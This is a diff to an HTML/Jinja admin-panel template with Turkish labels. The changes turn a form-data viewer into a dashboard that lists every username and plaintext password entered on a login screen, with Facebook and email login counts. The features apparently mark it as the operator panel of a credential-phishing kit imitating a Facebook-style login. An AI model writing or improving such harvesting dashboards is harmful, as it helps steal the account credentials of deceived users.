@@ -243,6 +243,20 @@
         .password-field:hover .toggle-icon {
             color: #333;
         }
+        
+        /* Credential Highlight Stilleri */
+        .credential-highlight {
+            background: linear-gradient(135deg, #f8f9ff 0%, #e8f4fd 100%);
+            border-left: 4px solid #667eea;
+            padding: 8px 12px;
+            border-radius: 6px;
+            margin: 8px 0;
+        }
+        
+        .credential-highlight .detail-label {
+            font-size: 0.95rem;
+            font-weight: 600;
+        }
     </style>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
 </head>
@@ -251,40 +265,49 @@
         <i class="fas fa-arrow-left"></i> Ana Sayfa
     </a>
     
+    <div style="position: fixed; top: 20px; right: 20px;">
+        <a href="/admin-login" class="back-btn" style="background: rgba(231, 76, 60, 0.9); color: white;">
+            <i class="fas fa-sign-out-alt"></i> Çıkış Yap
+        </a>
+    </div>
+    
     <div class="container">
         <div class="header">
             <h1><i class="fas fa-chart-bar"></i> Admin Paneli</h1>
-            <p>Form Gönderim Verileri ve İstatistikler</p>
+            <p>Kullanıcı Giriş Bilgileri ve İstatistikler</p>
+            <p style="font-size: 0.9rem; opacity: 0.8; margin-top: 10px;">
+                Giriş ekranına giren tüm kullanıcıların kullanıcı adı ve şifreleri burada görüntülenir
+            </p>
         </div>
         
         <div class="stats">
             <div class="stat-card">
                 <span class="stat-number">{{ submissions|length }}</span>
-                <div class="stat-label">Toplam Gönderim</div>
+                <div class="stat-label">Toplam Giriş Denemesi</div>
             </div>
             <div class="stat-card">
                 <span class="stat-number">
-                    {{ submissions|selectattr('login_method', 'equalto', 'email')|list|length + 
-                       submissions|selectattr('login_method', 'equalto', 'email_initial')|list|length }}
+                    {{ submissions|selectattr('type', 'equalto', 'login')|list|length }}
                 </span>
-                <div class="stat-label">Email Girişi</div>
+                <div class="stat-label">Kullanıcı Adı/Şifre Girişi</div>
             </div>
             <div class="stat-card">
                 <span class="stat-number">
-                    {{ submissions|selectattr('login_method', 'equalto', 'facebook')|list|length + 
-                       submissions|selectattr('login_method', 'equalto', 'facebook_initial')|list|length }}
+                    {{ submissions|selectattr('login_method', 'equalto', 'initial_form')|list|length }}
                 </span>
-                <div class="stat-label">Facebook Girişi</div>
+                <div class="stat-label">İlk Ekran Girişi</div>
             </div>
             <div class="stat-card">
-                <span class="stat-number">{{ submissions|selectattr('remember_me', 'equalto', true)|list|length }}</span>
-                <div class="stat-label">Beni Hatırla</div>
+                <span class="stat-number">
+                    {{ submissions|selectattr('email')|selectattr('password')|list|length }}
+                </span>
+                <div class="stat-label">Şifre ile Giriş</div>
             </div>
         </div>
         
         <div class="data-container">
             <div class="data-header">
-                <h2><i class="fas fa-database"></i> Form Verileri</h2>
+                <h2><i class="fas fa-key"></i> Kullanıcı Giriş Bilgileri</h2>
                 <button class="refresh-btn" onclick="window.location.reload()">
                     <i class="fas fa-sync-alt"></i> Yenile
                 </button>
@@ -299,6 +322,11 @@
                                 <i class="fab fa-facebook-f" style="display: {{ 'inline' if 'facebook' in submission.login_method else 'none' }}"></i>
                                 <i class="fas fa-envelope" style="display: {{ 'none' if 'facebook' in submission.login_method else 'inline' }}"></i>
                                 {{ submission.login_method|title|replace('_', ' ') }}
+                                {% if submission.email and submission.password %}
+                                <span style="color: #27ca3f; font-size: 0.8rem; margin-left: 8px;">
+                                    <i class="fas fa-check-circle"></i> Bilgiler Mevcut
+                                </span>
+                                {% endif %}
                             </span>
                             <span class="item-time">
                                 <i class="fas fa-clock"></i>
@@ -312,21 +340,26 @@
                             </div>
                             
                             {% if submission.email %}
-                            <div class="detail-item">
-                                <span class="detail-label">Email:</span> {{ submission.email }}
+                            <div class="detail-item credential-highlight">
+                                <span class="detail-label">👤 Kullanıcı Adı/Email:</span> 
+                                <strong style="color: #1976d2;">{{ submission.email }}</strong>
                             </div>
                             {% endif %}
                             
                             {% if submission.password %}
-                            <div class="detail-item">
-                                <span class="detail-label">Şifre:</span> 
+                            <div class="detail-item credential-highlight">
+                                <span class="detail-label">🔑 Şifre:</span> 
                                 <span class="password-field" data-password="{{ submission.password }}" onclick="togglePassword(this)">
-                                    <span class="password-hidden">{{ '*' * (submission.password|length) }}</span>
-                                    <span class="password-visible" style="display: none;">{{ submission.password }}</span>
+                                    <span class="password-hidden"><strong style="color: #d32f2f;">{{ '*' * (submission.password|length) }}</strong></span>
+                                    <span class="password-visible" style="display: none;"><strong style="color: #d32f2f;">{{ submission.password }}</strong></span>
                                     <i class="fas fa-eye toggle-icon"></i>
                                 </span>
                             </div>
                             {% endif %}
+                            
+                            <div class="detail-item">
+                                <span class="detail-label">Giriş Yöntemi:</span> {{ submission.login_method|title|replace('_', ' ') }}
+                            </div>
                             
                             {% if submission.remember_me is defined %}
                             <div class="detail-item">
@@ -349,9 +382,12 @@
                     {% endfor %}
                 {% else %}
                     <div class="no-data">
-                        <i class="fas fa-inbox"></i>
-                        <h3>Henüz veri yok</h3>
-                        <p>Form gönderileri burada görünecek</p>
+                        <i class="fas fa-key"></i>
+                        <h3>Henüz giriş verisi yok</h3>
+                        <p>Kullanıcı giriş denemeleri burada görünecek</p>
+                        <p style="font-size: 0.8rem; color: #999; margin-top: 10px;">
+                            Ana sayfadaki giriş formunu kullanarak test yapabilirsiniz
+                        </p>
                     </div>
                 {% endif %}
             </div>
